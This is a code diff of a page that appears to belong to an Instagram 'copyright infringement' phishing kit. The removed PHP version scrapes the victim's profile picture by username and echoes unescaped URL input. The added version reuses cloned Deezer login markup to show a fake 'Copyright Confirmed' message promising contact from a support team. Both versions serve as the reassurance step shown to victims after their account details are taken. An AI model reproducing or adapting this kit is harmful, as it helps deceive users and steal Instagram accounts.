@@ -1,113 +1,124 @@
-<?php
 
-
-require 'slokerapi.php';
-session_start();
-error_reporting(E_ALL);
-
-
-
-$username=$_GET['username'];
-$url2="https://smihub.com/search?query=$username";
-$ip=str_get_html(file_get_contents($url2));
-$pp=$ip->find("img[class='img-fluid w-100']",0)->src;
-$tik="-";
-$followers="-";
-
-
-
-
-
-?>
-
-
-<!--ShuTTeRLooK - Script Kurucusu -->
-
-
-<!DOCTYPE html>
-<html lang="en">
+<html lang="tr-TR" class="no-js" xmlns:fb="http://www.facebook.com/2008/fbml">
 <head>
-<title>Copyright Infringement Detected @<?php echo $username; ?></title>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1">
-<!--===============================================================================================-->	
-<link rel="icon" type="image/png" href="images/favicon.ico"/>
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
-<!--===============================================================================================-->	
-	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
-<!--===============================================================================================-->	
-	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="css/util.css">
-	<link rel="stylesheet" type="text/css" href="css/main.css">
-<!--===============================================================================================-->
-</head>
-<body>
-	
-	
-	<div class="container-login100" >
-		<div class="wrap-login100 p-l-55 p-r-55 p-t-80 p-b-30">
-			<form method="post" action="https://instagram.com/<?php echo $username; ?>" class="login100-form validate-form">
-			<center><img style="max-width:50%; border-radius:50%; margin-top:-70px;" width="100"  src="<?php echo $pp; ?>"></center><br>
-				<span class="login100-form-title p-b-37">
-				@<?php echo $username; ?>
-				</span>
-                <center>
-                <b>Successfully Completed</b>
-          <hr>
-            <center><p>Thank you for verifying your account. Our team will contact you as soon as possible.</p></center>
-            <br>
-			  <strong><p>Case ID: <?php echo(rand(10,10000000));?></p></strong>
-			  <br>
-</center>
+	<meta charset="utf-8">
+	<title>Copyright | Help Center</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 
+	<link href="img/hydraicon.png" rel="shortcut icon" type="image/x-icon">
 
-				<div class="container-login100-form-btn">
-					<button class="login100-form-btn">
-					Go to Instagram
-					</button>
-				</div>
+   
+   <meta property="og:type" content="website">
+   <meta property="og:url" content="#">
 
-			
-
-			</form>
-
-			
-		</div>
-	</div>
-	
 	
 
-	<div id="dropDownSelect1"></div>
-	
-<!--===============================================================================================-->
-	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
-<!--===============================================================================================-->
-	<script src="vendor/animsition/js/animsition.min.js"></script>
-<!--===============================================================================================-->
-	<script src="vendor/bootstrap/js/popper.js"></script>
-	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
-<!--===============================================================================================-->
-	<script src="vendor/select2/select2.min.js"></script>
-<!--===============================================================================================-->
-	<script src="vendor/daterangepicker/moment.min.js"></script>
-	<script src="vendor/daterangepicker/daterangepicker.js"></script>
-<!--===============================================================================================-->
-	<script src="vendor/countdowntime/countdowntime.js"></script>
-<!--===============================================================================================-->
-	<script src="js/main.js"></script>
+	<link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/npfkoakaabdallkcdbpkkhfilkkngakh">
+	<link rel="search" type="application/opensearchdescription+xml" href="xml/opensearch.xml" title="Deezer.com">
+	<link rel="canonical" href="login.php">
 
-</body>
+
+	<link href="cache/css/sass_c/app-auth.a52ae0cda4701a0aa189.css" rel="stylesheet" type="text/css">
+	<script>
+if (window.self === window.top) {
+	document.domain = '#';
+}
+</script>
+<script src="cache/js/legacy.09c829a3e5225510b815.js"></script>
+<script src="cache/js/runtime.8046a83e21c6fed3b78f.js"></script>
+<script src="cache/js/bocal-tr-TR.98da80c1370ae1f96b10.js" defer="true"></script>
+<script src="cache/js/app-auth.92afb7a1e7f0af7e03cc.js" defer="true"></script>
+	
+		</head>
+<body class="unlogged-root-page dir-ltr " data-theme="dark" data-themed="true">
+<div class="tempo-topbar">
+    <a href="/" id="topbar-deezer-logo">
+    
+  </a>
+  <div class="tempo-topbar-actions">
+      </div>
+</div>
+<div id="auth-page">
+    <div class="auth-form-container auth-login gap-l-bottom">
+        <div class="unlogged-authen unlogged-login">
+            <div class="unlogged-container">
+                <div class="unlogged-container-inner">
+                    <div class="unlogged-form-container">
+                        <h1 class="auth-title unlogged-heading-2">Copyright Confirmed</h1>
+
+                        <!-- Partnership Activation entrypoint -->
+                                                <div class="auth-partners-card gap-l-top">
+                                                    </div>
+                        
+                        <!-- Switch login / reg -->
+                        <div class="auth-links switch-auth-type-link">
+    <div
+        style="color:white;">Thank you for confirming your account. Our support team will contact you within 24-48 hours.        
+    </div>
+</div>
+
+ <div align="center">
+
+								<img src="img/hydra.png" width="150"/></div>
+
+</div>                
+        <br>
+	<div>						
+   <a href="https://instagram.com/" class="auth-cta gap-m-top">
+        <span class="unlogged-btn-label">Go to Instagram</span>
+		</a>
+</div>
+
+
+<div class="recaptcha-wrapper">
+    <div class="recaptcha-container">
+        <div id="recaptcha_enterprise_container"></div>    </div>
+</div>
+
+    
+
+  
+    <input type="hidden" id="login_method" name="login_method" value="email">
+</form>
+
+<div class="auth-links gap-l-vertical">
+    <a href="https://www.instagram.com/accounts/password/reset/" id="login_forgot_password" class="auth-link-btn" role="button">
+        <button  class="bold">Forgot Password ?</button>
+    </a>
+    </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Recaptcha Legal mentions -->
+        
+    </div>
+</div>
+<div id="react-footer" class="footer-container"></div>
+<div class="react-cookie" id="react-cookie"></div>
+<div class="modal" id="modal" role="dialog" aria-hidden="true" style="display: none;">
+	<div class="modal-backdrop"></div>
+	<div class="modal-wrapper"></div>
+</div><!-- Google Tag Manager -->
+<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-PPQNZ6" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<script>
+window.dataLayer = window.dataLayer || [];
+window.dataLayer.push({
+    'deezer_user_id': 0,
+    'dzr_uniq_id': 'dzr_uniq_id_fr6df580c8b57eb545caac10bba3ef3dde849b87',
+    'offer_id': 0,
+    'new_user': 0,
+    'sub': 0,
+    'country': 'TR'
+});
+window.dataLayer.push({"virtualpageurl":"\/tr\/login","pagename":"login","language":"tr","uilogged":false,"pagecategory":"login"});
+(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+    '//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-PPQNZ6');</script>
+<!-- End Google Tag Manager -->
+<noscript></noscript><script type="text/javascript" src="/vmKaNSBrT-Jrz0R_MA/YG1mcwrbfOOY/AxAqCSofPw/DiguZR/0xM0UB"></script></body>
 </html>
